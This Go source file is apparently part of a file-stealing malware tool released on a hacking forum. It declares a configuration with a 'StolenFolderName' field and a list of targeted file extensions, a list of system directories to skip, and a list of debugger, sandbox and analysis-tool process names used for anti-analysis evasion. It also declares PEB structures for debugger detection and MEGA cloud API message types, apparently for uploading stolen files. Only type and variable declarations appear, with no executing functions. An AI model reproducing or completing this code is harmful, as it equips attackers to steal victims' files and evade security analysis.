/*
Telegram: https://t.me/n1k7l4i
Open Sourced by n1k7 from breached forums, program is not for sale anymore.
Don't sell this product as everyone deserves to use it for free as they like.
~ peace out.
*/
package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"syscall"
)

var (
	modntdll                      = syscall.NewLazyDLL("ntdll.dll")
	procNtQueryInformationProcess = modntdll.NewProc("NtQueryInformationProcess")

	configJs   Config
	logFlag    bool
	apiStatus  string
	logConsole string

	skipDirs = map[string]bool{
		"AppData":             true,
		"Boot":                true,
		"Windows":             true,
		"WINDOWS":             true,
		"Windows.old":         true,
		"Tor Browser":         true,
		"Internet Explorer":   true,
		"Google":              true,
		"Opera":               true,
		"Opera Software":      true,
		"Mozilla":             true,
		"Mozilla Firefox":     true,
		"$Recycle.Bin":        true,
		"ProgramData":         true,
		"All Users":           true,
		"Program Files":       true,
		"Program Files (x86)": true,
	}

	processes = []string{
		"ProcessHacker.exe",
		"httpdebuggerui.exe",
		"wireshark.exe",
		"fiddler.exe",
		"regedit.exe",
		"cmd.exe",
		"taskmgr.exe",
		"df5serv.exe",
		"processhacker.exe",
		"ida64.exe",
		"ollydbg.exe",
		"pestudio.exe",
		"x32dbg.exe",
		"x64dbg.exe",
		"x96dbg.exe",
		"prl_cc.exe",
		"prl_tools.exe",
		"qemu-ga.exe",
		"joeboxcontrol.exe",
		"ksdumperclient.exe",
		"xenservice.exe",
		"joeboxserver.exe",
		"devenv.exe",
		"IMMUNITYDEBUGGER.EXE",
		"ImportREC.exe",
		"reshacker.exe",
		"windbg.exe",
		"32dbg.exe",
		"64dbg.exex",
		"protection_id.exex",
		"scylla_x86.exe",
		"scylla_x64.exe",
		"scylla.exe",
		"idau64.exe",
		"idau.exe",
		"idaq64.exe",
		"idaq.exe",
		"idaw.exe",
		"idag64.exe",
		"idag.exe",
		"ida64.exe",
		"ida.exe",
	}
)

type Config struct {
	API struct {
		ID       string `json:"id"`
		Password string `json:"password"`
	} `json:"API"`
	Path                   string   `json:"Path"`
	StolenFolderName       string   `json:"StolenFolderName"`
	MaxFileSizeMB          int      `json:"MaxFileSizeMB"`
	SplitSize              int      `json:"SplitSize"`
	TargetedFileExtensions []string `json:"TargetedFileExtensions"`
	Mode                   string   `json:"Mode"`
}

type Time struct {
	Datetime string `json:"datetime"`
}

type ProcessBasicInformation struct {
	Reserved1       uintptr
	PebBaseAddress  *Peb
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

type Peb struct {
	Reserved1                      byte
	BeingDebugged                  byte
	Reserved2                      [2]byte
	Reserved3                      [2]uintptr
	Ldr                            uintptr
	ProcessParameters              uintptr
	Reserved4                      [3]uintptr
	AtlThunkSListPtr32             uintptr
	Reserved5                      uintptr
	Reserved6                      uint32
	Reserved7                      uintptr
	Mutant                         uintptr
	ImageBaseAddress               uintptr
	LdrData                        uintptr
	ProcessParameters2             uintptr
	Reserved8                      [3]uintptr
	AtlThunkSListPtr               uintptr
	Reserved9                      uint32
	Reserved10                     uint32
	MemoryManagementFlags          uintptr
	BaseAddress                    uintptr
	Reserved11                     [2]uintptr
	PebAddress                     uintptr
	Reserved12                     uint32
	SystemAssemblyStorage          uint32
	SystemAssemblyStorage2         uint32
	TlsExpansionCounter            uintptr
	TlsBitmap                      uintptr
	TlsBitmapBits                  [2]uint32
	ReadOnlySharedMemoryBase       uintptr
	HotpatchInformation            uintptr
	ReadOnlyStaticServerData       *uintptr
	InitAnsiCodePageDataUnused     *byte
	OemCodePageDataUnused          *byte
	InitUnicodeCaseTableDataUnused *uint16
	InitNlsSectionOffsetUnused     *byte
	InitUnicodeCaseTableData       *uint16
	NlsSectionOffset               *byte
	InitAnsiCodePageData           *byte
	OemCodePageData                *byte
}

var (
	// EINTERNAL General errors
	EINTERNAL  = errors.New("Internal error occured")
	EARGS      = errors.New("Invalid arguments")
	EAGAIN     = errors.New("Try again")
	ERATELIMIT = errors.New("Rate limit reached")
	EBADRESP   = errors.New("Bad response from server")

	// Upload errors
	EFAILED  = errors.New("The upload failed. Please restart it from scratch")
	ETOOMANY = errors.New("Too many concurrent IP addresses are accessing this upload target URL")
	ERANGE   = errors.New("The upload file packet is out of range or not starting and ending on a chunk boundary")
	EEXPIRED = errors.New("The upload target URL you are trying to access has expired. Please request a fresh one")

	// Filesystem/Account errors
	ENOENT              = errors.New("Object (typically, node or user) not found")
	ECIRCULAR           = errors.New("Circular linkage attempted")
	EACCESS             = errors.New("Access violation")
	EEXIST              = errors.New("Trying to create an object that already exists")
	EINCOMPLETE         = errors.New("Trying to access an incomplete resource")
	EKEY                = errors.New("A decryption operation failed")
	ESID                = errors.New("Invalid or expired user session, please relogin")
	EBLOCKED            = errors.New("User blocked")
	EOVERQUOTA          = errors.New("Request over quota")
	ETEMPUNAVAIL        = errors.New("Resource temporarily not available, please try again later")
	EMACMISMATCH        = errors.New("MAC verification failed")
	EBADATTR            = errors.New("Bad node attribute")
	ETOOMANYCONNECTIONS = errors.New("Too many connections on this resource.")
	EWRITE              = errors.New("File could not be written to (or failed post-write integrity check).")
	EREAD               = errors.New("File could not be read from (or changed unexpectedly during reading).")
	EAPPKEY             = errors.New("Invalid or missing application key.")
	ESSL                = errors.New("SSL verification failed")
	EGOINGOVERQUOTA     = errors.New("Not enough quota")
	EMFAREQUIRED        = errors.New("Multi-factor authentication required")

	// Config errors
	EWORKER_LIMIT_EXCEEDED = errors.New("Maximum worker limit exceeded")
)

type ErrorMsg int

func parseError(errno ErrorMsg) error {
	switch {
	case errno == 0:
		return nil
	case errno == -1:
		return EINTERNAL
	case errno == -2:
		return EARGS
	case errno == -3:
		return EAGAIN
	case errno == -4:
		return ERATELIMIT
	case errno == -5:
		return EFAILED
	case errno == -6:
		return ETOOMANY
	case errno == -7:
		return ERANGE
	case errno == -8:
		return EEXPIRED
	case errno == -9:
		return ENOENT
	case errno == -10:
		return ECIRCULAR
	case errno == -11:
		return EACCESS
	case errno == -12:
		return EEXIST
	case errno == -13:
		return EINCOMPLETE
	case errno == -14:
		return EKEY
	case errno == -15:
		return ESID
	case errno == -16:
		return EBLOCKED
	case errno == -17:
		return EOVERQUOTA
	case errno == -18:
		return ETEMPUNAVAIL
	case errno == -19:
		return ETOOMANYCONNECTIONS
	case errno == -20:
		return EWRITE
	case errno == -21:
		return EREAD
	case errno == -22:
		return EAPPKEY
	case errno == -23:
		return ESSL
	case errno == -24:
		return EGOINGOVERQUOTA
	case errno == -26:
		return EMFAREQUIRED
	}

	return fmt.Errorf("Unknown mega error %d", errno)
}

type PreloginMsg struct {
	Cmd  string `json:"a"`
	User string `json:"user"`
}

type PreloginResp struct {
	Version int    `json:"v"`
	Salt    string `json:"s"`
}

type LoginMsg struct {
	Cmd        string `json:"a"`
	User       string `json:"user"`
	Handle     string `json:"uh"`
	SessionKey string `json:"sek,omitempty"`
	Si         string `json:"si,omitempty"`
	Mfa        string `json:"mfa,omitempty"`
}

type LoginResp struct {
	Csid       string `json:"csid"`
	Privk      string `json:"privk"`
	Key        string `json:"k"`
	Ach        int    `json:"ach"`
	SessionKey string `json:"sek"`
	U          string `json:"u"`
}

type UserMsg struct {
	Cmd string `json:"a"`
}

type UserResp struct {
	U     string `json:"u"`
	S     int    `json:"s"`
	Email string `json:"email"`
	Name  string `json:"name"`
	Key   string `json:"k"`
	C     int    `json:"c"`
	Pubk  string `json:"pubk"`
	Privk string `json:"privk"`
	Terms string `json:"terms"`
	TS    string `json:"ts"`
}

type QuotaMsg struct {
	// Action, should be "uq" for quota request
	Cmd string `json:"a"`
	// xfer should be 1
	Xfer int `json:"xfer"`
	// Without strg=1 only reports total capacity for account
	Strg int `json:"strg,omitempty"`
}

type QuotaResp struct {
	// Mstrg is total capacity in bytes
	Mstrg uint64 `json:"mstrg"`
	// Cstrg is used capacity in bytes
	Cstrg uint64 `json:"cstrg"`
	// Per folder usage in bytes?
	Cstrgn map[string][]int64 `json:"cstrgn"`
}

type FilesMsg struct {
	Cmd string `json:"a"`
	C   int    `json:"c"`
}

type FSNode struct {
	Hash   string `json:"h"`
	Parent string `json:"p"`
	User   string `json:"u"`
	T      int    `json:"t"`
	Attr   string `json:"a"`
	Key    string `json:"k"`
	Ts     int64  `json:"ts"`
	SUser  string `json:"su"`
	SKey   string `json:"sk"`
	Sz     int64  `json:"s"`
}

type FilesResp struct {
	F []FSNode `json:"f"`

	Ok []struct {
		Hash string `json:"h"`
		Key  string `json:"k"`
	} `json:"ok"`

	S []struct {
		Hash string `json:"h"`
		User string `json:"u"`
	} `json:"s"`
	User []struct {
		User  string `json:"u"`
		C     int    `json:"c"`
		Email string `json:"m"`
	} `json:"u"`
	Sn string `json:"sn"`
}

type FileAttr struct {
	Name string `json:"n"`
}

type GetLinkMsg struct {
	Cmd string `json:"a"`
	N   string `json:"n"`
}

type DownloadMsg struct {
	Cmd string `json:"a"`
	G   int    `json:"g"`
	P   string `json:"p,omitempty"`
	N   string `json:"n,omitempty"`
	SSL int    `json:"ssl,omitempty"`
}

type DownloadResp struct {
	G    string   `json:"g"`
	Size uint64   `json:"s"`
	Attr string   `json:"at"`
	Err  ErrorMsg `json:"e"`
}

type UploadMsg struct {
	Cmd string `json:"a"`
	S   int64  `json:"s"`
	SSL int    `json:"ssl,omitempty"`
}

type UploadResp struct {
	P string `json:"p"`
}

type UploadCompleteMsg struct {
	Cmd string `json:"a"`
	T   string `json:"t"`
	N   [1]struct {
		H string `json:"h"`
		T int    `json:"t"`
		A string `json:"a"`
		K string `json:"k"`
	} `json:"n"`
	I string `json:"i,omitempty"`
}

type UploadCompleteResp struct {
	F []FSNode `json:"f"`
}

type MoveFileMsg struct {
	Cmd string `json:"a"`
	N   string `json:"n"`
	T   string `json:"t"`
	I   string `json:"i"`
}

type FileAttrMsg struct {
	Cmd  string `json:"a"`
	Attr string `json:"attr"`
	Key  string `json:"key"`
	N    string `json:"n"`
	I    string `json:"i"`
}

type FileDeleteMsg struct {
	Cmd string `json:"a"`
	N   string `json:"n"`
	I   string `json:"i"`
}

// GenericEvent is a generic event for parsing the Cmd type before
// decoding more specifically
type GenericEvent struct {
	Cmd string `json:"a"`
}

// FSEvent - event for various file system events
//
// Delete (a=d)
// Update attr (a=u)
// mNew nodes (a=t)
type FSEvent struct {
	Cmd string `json:"a"`

	T struct {
		Files []FSNode `json:"f"`
	} `json:"t"`
	Owner string `json:"ou"`

	N    string `json:"n"`
	User string `json:"u"`
	Attr string `json:"at"`
	Key  string `json:"k"`
	Ts   int64  `json:"ts"`
	I    string `json:"i"`
}

// Events is received from a poll of the server to read the events
//
// Each event can be an error message or a different field so we delay
// decoding
type Events struct {
	W  string            `json:"w"`
	Sn string            `json:"sn"`
	E  []json.RawMessage `json:"a"`
}
